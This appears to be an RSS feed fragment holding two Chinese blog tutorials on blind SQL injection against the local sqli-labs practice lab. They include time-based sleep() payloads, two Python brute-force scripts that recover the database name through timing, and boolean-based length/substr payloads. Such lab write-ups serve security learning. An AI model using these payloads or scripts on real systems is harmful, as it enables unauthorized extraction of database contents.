            <description><![CDATA[ &lt;h1 id=&#34;SQL注入之时间盲注&#34;&gt;&lt;a href=&#34;#SQL注入之时间盲注&#34; class=&#34;headerlink&#34; title=&#34;SQL注入之时间盲注&#34;&gt;&lt;/a&gt;SQL注入之时间盲注&lt;/h1&gt;&lt;p&gt;在上一篇博客中，了解了&lt;strong&gt;布尔盲注&lt;/strong&gt;，其实&lt;strong&gt;布尔盲注&lt;/strong&gt;和&lt;strong&gt;时间盲注&lt;/strong&gt;大致相同，注入原理是一致的，区别就是一个&lt;strong&gt;还是有回显的&lt;/strong&gt;，一个&lt;strong&gt;彻底没有回显&lt;/strong&gt;，通过构造语句，通过页面响应的时长，来判断信息，这就是时间盲注。&lt;/p&gt;
&lt;p&gt;先来学习一下&lt;strong&gt;时间盲注&lt;/strong&gt;所需要的函数&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sleep()//延迟函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if(condition,true,false)//若条件为真 返回true，若条件为假 返回false&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;substring(&amp;quot;string&amp;quot;,strart,length)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;主要的也就是这几个了，下面就通过&lt;strong&gt;sqli-labs&lt;/strong&gt;第十关来练习时间盲注&lt;/p&gt;
&lt;h2 id=&#34;尝试注入报错&#34;&gt;&lt;a href=&#34;#尝试注入报错&#34; class=&#34;headerlink&#34; title=&#34;尝试注入报错&#34;&gt;&lt;/a&gt;尝试注入报错&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-10/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001170904491.png&#34; alt=&#34;image-20221001170904491&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-10/?id=1&amp;#x27;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001170453268.png&#34; alt=&#34;image-20221001170453268&#34;&gt;&lt;/p&gt;
&lt;p&gt;构造&lt;code&gt;and 1&lt;/code&gt;条件，然后使用if条件语句包含时间盲注。&lt;/p&gt;
&lt;p&gt;如果database()的长度大于5，那么返回1，否则延迟10s&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=1&amp;quot; and if(length(database())&amp;gt;5,1,sleep(10))--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001175533536.png&#34; alt=&#34;image-20221001175533536&#34;&gt;&lt;/p&gt;
&lt;p&gt;将长度改为和10进行比较&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-10/?id=1&amp;quot; and if(length(database())&amp;gt;10,1,sleep(10))--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;开始转圈等待10s了，所以存在时间盲注条件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001184209796.png&#34; alt=&#34;image-20221001184209796&#34;&gt;&lt;/p&gt;
&lt;p&gt;手工注入太浪费时间，开始研究脚本爆破&lt;/p&gt;
&lt;h2 id=&#34;尝试脚本爆破&#34;&gt;&lt;a href=&#34;#尝试脚本爆破&#34; class=&#34;headerlink&#34; title=&#34;尝试脚本爆破&#34;&gt;&lt;/a&gt;尝试脚本爆破&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;时间盲注只需要这两个模块，一个获取时间，一个请求网址&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;import time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import requests&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;全局就定义了1个参数，数据库可能采用的字符&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;words = &amp;quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_-&amp;#123;&amp;#125;, &amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;判断database()长度的函数，也就是数据库名的长度，可以减少判断数据库名的时间，可以修改length()内部的参数来判断其他变量的长度，减少跑出名字的时间&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;words = &lt;span class=&#34;string&#34;&gt;&amp;quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_-&amp;#123;&amp;#125;, &amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;target_length&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    length = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/sqli/Less-10/?id=1\&amp;quot; and if(length(database())=%d,sleep(2),0)&amp;quot;&lt;/span&gt; %(i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        url = url+&lt;span class=&#34;string&#34;&gt;&amp;#x27;%23&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(url)  &lt;span class=&#34;comment&#34;&gt;#可输出测试是否写错&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        start_time = time.time()&lt;span class=&#34;comment&#34;&gt;#请求开始的时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        requests.get(url)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        end_time = time.time()&lt;span class=&#34;comment&#34;&gt;#请求结束的时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        t = end_time - start_time&lt;span class=&#34;comment&#34;&gt;#时间差&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; t &amp;gt;= &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            length = i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;target_lenght is: &amp;quot;&lt;/span&gt;, length)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;target_name&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    name = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; words:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;#url = &amp;quot;http://127.0.0.1/sqli/Less-10/?id=1\&amp;quot; and if(ascii(substr(select group_concat(table_name) from information_schema.tables where table_schema=database(),%d,1)=ord(&amp;#x27;%s&amp;#x27;)),sleep(1),0) --+&amp;quot; %(i,j)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/sqli/Less-10/?id=1\&amp;quot; and if(ascii(substr(database(),%d,1))=ord(&amp;#x27;%s&amp;#x27;),sleep(2),0) --+&amp;quot;&lt;/span&gt; %(i,j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            url = url+&lt;span class=&#34;string&#34;&gt;&amp;#x27;%23&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(url)  &lt;span class=&#34;comment&#34;&gt;#可输出测试是否写错&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            start_time = time.time()&lt;span class=&#34;comment&#34;&gt;#请求开始的时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            requests.get(url)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            end_time = time.time()&lt;span class=&#34;comment&#34;&gt;#请求结束的时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            t = end_time - start_time&lt;span class=&#34;comment&#34;&gt;#时间差&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; t &amp;gt;= &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                name += j&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;target_name is: &amp;quot;&lt;/span&gt;+ name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#target_length()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target_name()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以得出，长度为8，库名为&lt;strong&gt;security&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001200020143.png&#34; alt=&#34;image-20221001200020143&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来就改改url就可以爆破其他值了。&lt;/p&gt;
&lt;p&gt;通用&lt;code&gt;GET类型时间盲注&lt;/code&gt;题目脚本小练习&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = &lt;span class=&#34;string&#34;&gt;&amp;#x27;Username: kevin&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;words = &lt;span class=&#34;string&#34;&gt;&amp;#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-.&amp;#123;&amp;#125;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/SQLC/sql-2.php/SQl-4.php?id=1&amp;#x27;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;target_length&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	length = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		payload = &lt;span class=&#34;string&#34;&gt;&amp;quot; and if(length(database())=&amp;#123;&amp;#125;,sleep(2),0) %23&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(url + payload)  &lt;span class=&#34;comment&#34;&gt;#可输出测试是否写错&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		start = time.time()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		requests.get(url + payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		end = time.time()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		t = end - start&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; t &amp;gt;=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			length = i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;target_length is:&amp;quot;&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(length))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;target_name&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;length&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	name = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,length+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; words:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			payload = &lt;span class=&#34;string&#34;&gt;&amp;quot; and if(ascii(mid(database(),&amp;#123;&amp;#125;,1))=ord(&amp;#x27;&amp;#123;&amp;#125;&amp;#x27;),sleep(2),0) %23&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(i,j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(url + payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			start = time.time()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			requests.get(url + payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			end = time.time()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			t = end - start&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; t &amp;gt;=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				name += j&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;target_name is:&amp;quot;&lt;/span&gt;, name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#target_length() #结果为target_length is: 9&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target_name(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#参数填入上一步的结果&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;C:\Users\JcH4liXh\AppData\Roaming\Typora\typora-user-images\image-20221001213601177.png&#34; alt=&#34;image-20221001213601177&#34;&gt;&lt;/p&gt;
&lt;p&gt;至此，时间盲注演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</guid>
            <title>布尔盲注</title>
            <link>https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</link>
            <category>SQL注入探究</category>
            <pubDate>Sat, 01 Oct 2022 01:41:34 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL-注入之布尔盲注&#34;&gt;&lt;a href=&#34;#SQL-注入之布尔盲注&#34; class=&#34;headerlink&#34; title=&#34;SQL 注入之布尔盲注&#34;&gt;&lt;/a&gt;SQL 注入之布尔盲注&lt;/h1&gt;&lt;p&gt;本篇使用布尔盲注。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt;：盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;布尔盲注&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;原理：&lt;/strong&gt;&lt;br&gt;注入的时候只会返回&lt;code&gt;True和False&lt;/code&gt;，所以布尔盲注就是根据页面显示的是&lt;code&gt;True还是False&lt;/code&gt;进行猜测数据库中的信息。&lt;/p&gt;
&lt;p&gt;布尔盲注需要几个函数的辅助，就先来了解一下这几个函数&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;length()函数可返回字符串的长度&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;substring()函数可以截取字符串，可指定开始的位置和截取的长度&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ord()函数可以返回单个字符的ASCII码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;char()函数可将ASCII码转换为对应的字符&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;具体的用法可以参考大佬的博客&lt;a href=&#34;https://www.jianshu.com/p/f0174ea6c69d&#34;&gt;Mysql语法介绍&lt;/a&gt;，接下来就通过&lt;strong&gt;sql-labs&lt;/strong&gt;练习布尔盲注。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;判断注入点&lt;/strong&gt;（也就是闭合符号）&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;发现输入&lt;code&gt;id=1&amp;#39;&lt;/code&gt;没有错误回显&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001005755289.png&#34; alt=&#34;image-20221001005755289&#34;&gt;&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;id=1&amp;#39;&lt;/code&gt;后再加上&lt;strong&gt;注释符号&lt;/strong&gt;后又回显正确，所以判定闭合符号为&lt;code&gt;&amp;#39;&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001005844512.png&#34; alt=&#34;image-20221001005844512&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;爆数据库长度&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;由于我们知道 &lt;code&gt;select uname = &amp;#39;id&amp;#39; and 1 from xxxx&lt;/code&gt; 在id有效的情况下，加入&lt;code&gt;and 1&lt;/code&gt;不会影响整体判断&lt;/p&gt;
&lt;p&gt;那么，这里的1可以被任何的查询正确的&lt;code&gt;布尔型判断语句&lt;/code&gt;返回结果所替代，比如&lt;code&gt;length(database()) =x&lt;/code&gt;就可以来代替 1 这个值。&lt;/p&gt;
&lt;p&gt;只有当x等于正确的数据库长度时，才能使&lt;code&gt;and 1 成立&lt;/code&gt;，才能使整个查询语句回显正确的内容&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27; and length(database())=1 --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27; and length(database())=2 --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.....&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27; and length(database())=8 --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001010826646.png&#34; alt=&#34;image-20221001010826646&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001010848025.png&#34; alt=&#34;image-20221001010848025&#34;&gt;&lt;/p&gt;
&lt;p&gt;手工注入的话就要一遍一遍的试试，将后面的长度不断增大，最后得出数据库名的长度为&lt;code&gt;8&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;爆数据库名&lt;/strong&gt;&lt;br&gt;知道了数据库名的长度，接下来就来爆破数据库名&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;以这一句为基础&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27;and 1 --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;继续深入构造爆破查询语句：&lt;/p&gt;
&lt;h3 id=&#34;注入步骤&#34;&gt;&lt;a href=&#34;#注入步骤&#34; class=&#34;headerlink&#34; title=&#34;注入步骤&#34;&gt;&lt;/a&gt;注入步骤&lt;/h3&gt;&lt;p&gt;布尔盲注爆破数据库名&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27;and ascii(substr(database(),1,1))=1 --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后交给&lt;strong&gt;BurpSuit&lt;/strong&gt;抓包，选择&lt;strong&gt;Send to Intruder&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;清空变量&#34;&gt;&lt;a href=&#34;#清空变量&#34; class=&#34;headerlink&#34; title=&#34;清空变量&#34;&gt;&lt;/a&gt;清空变量&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;image-20221001011237616.png&#34; alt=&#34;image-20221001011237616&#34;&gt;&lt;/p&gt;
